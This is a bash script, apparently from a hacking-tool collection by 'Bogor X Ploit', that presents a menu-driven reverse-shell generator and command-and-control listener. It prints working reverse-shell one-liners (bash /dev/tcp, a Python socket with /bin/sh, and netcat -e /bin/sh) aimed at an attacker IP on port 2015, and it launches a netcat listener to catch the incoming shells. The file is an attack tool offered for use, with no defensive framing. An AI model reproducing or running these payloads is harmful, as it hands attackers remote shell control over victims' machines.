#!/usr/bin/env bash
# ============================================
#   SLEEP PARALYSIS - Self Contained Module
#   By Bogor X Ploit
# ============================================

# --- LIBRARY (Tanam Langsung) ---
C='\033[0;36m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'

bxp_ascii_title() {
    clear; sleep 0.3
    echo -e "${R}"
    cat <<'ASCII'
 ____  _      ____  ____  ____    ____    _    ____  _      __   __  ___  ____  
/ ___|| |    | ____|  _ \|  _ \  |  _ \  / \  |  _ \| |     \ \ / / / _ \|  _ \ 
\___ \| |    |  _| | |_) | |_) | | |_) |/ _ \ | |_) | |      \ V / | | | | |_) |
 ___) | |___ | |___|  __/|  __/  |  __// ___ \|  _ <| |___    | |  | |_| |  _ / 
|____/|_____||_____|_|   |_|     |_|  /_/   \_\_| \_\_____|   |_|   \___/|_| \_\
ASCII
    echo -e "${N}\n"; sleep 0.3
}

trap_ctrl_c() { echo -e "\n${R}[!] Listener stopped by user.${N}"; sleep 1; }
# -------------------------------------------------

while true; do
    bxp_ascii_title
    
    PUB_IP=$(curl -s https://api.ipify.org)
    
    echo -e "  ${Y}[*] C2 Node IP: ${W}${PUB_IP}${N}"
    echo -e "${C}  ==================================================${N}"
    echo -e "${C}  --------------------------------------------------${N}"
    echo ""
    echo -e "  \033[1;32m[1]\033[0m  \033[1;37mDeploy Bash Session Bridge\033[0m"
    echo ""
    echo -e "  \033[1;32m[2]\033[0m  \033[1;37mDeploy Python Socket Connector\033[0m"
    echo ""
    echo -e "  \033[1;32m[3]\033[0m  \033[1;37mDeploy Netcat Payload\033[0m"
    echo ""
    echo -e "  \033[1;33m[4]\033[0m  \033[1;37mInitiate C2 Listener Port 2015\033[0m"
    echo ""
    echo -e "  \033[1;31m[5]\033[0m  \033[1;37mBack to Main Menu\033[0m"
    echo ""
    echo -e "${C}  --------------------------------------------------${N}"
    echo ""
    echo -ne "  ${Y}Select option > ${N}"
    read -r rs_choice

    case "$rs_choice" in
        1)
            echo ""
            echo -ne "  ${Y}Enter C2 IP default: $PUB_IP > ${N}"
            read -r target_ip
            [ -z "$target_ip" ] && target_ip="$PUB_IP"
            echo ""
            echo -e "  ${G}[+] Compiling Bash Session Bridge...${N}"; sleep 1
            echo -e "  ${W}Vector:${N} bash -i >& /dev/tcp/${target_ip}/2015 0>&1"
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        2)
            echo ""
            echo -ne "  ${Y}Enter C2 IP default: $PUB_IP > ${N}"
            read -r target_ip
            [ -z "$target_ip" ] && target_ip="$PUB_IP"
            echo ""
            echo -e "  ${G}[+] Compiling Python Socket Connector...${N}"; sleep 1
            echo -e "  ${W}Vector:${N}"
            echo -e "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${target_ip}\",2015));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        3)
            echo ""
            echo -ne "  ${Y}Enter C2 IP default: $PUB_IP > ${N}"
            read -r target_ip
            [ -z "$target_ip" ] && target_ip="$PUB_IP"
            echo ""
            echo -e "  ${G}[+] Compiling Netcat Payload...${N}"; sleep 1
            echo -e "  ${W}Vector:${N} nc -e /bin/sh ${target_ip} 2015"
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        4)
            echo ""
            echo -e "  ${G}[+] Starting C2 Listener on port 2015...${N}"
            echo -e "  ${Y}[!] Awaiting incoming connections... (Press CTRL+C to stop)${N}"
            trap trap_ctrl_c SIGINT
            if command -v nc >/dev/null 2>&1; then nc -lvnp 2015
            elif command -v ncat >/dev/null 2>&1; then ncat -lvnp 2015; fi
            trap - SIGINT
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        5) exit 0 ;;
        *) echo -e "  ${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
